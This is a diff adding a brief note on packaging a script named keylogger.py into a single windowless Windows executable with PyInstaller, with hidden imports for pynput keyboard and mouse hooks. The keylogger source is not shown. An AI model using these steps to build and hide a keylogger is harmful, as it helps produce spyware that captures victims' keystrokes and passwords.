@@ -1,0 +1,7 @@
+Steps to create exe file in cmd
+
+1. Install auto py to exe
+     pip install pyinstaller.
+2. Next use the below command:
+     pyinstaller --onefile -w keylogger.py --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32
+3. An exe file is created in respective folder
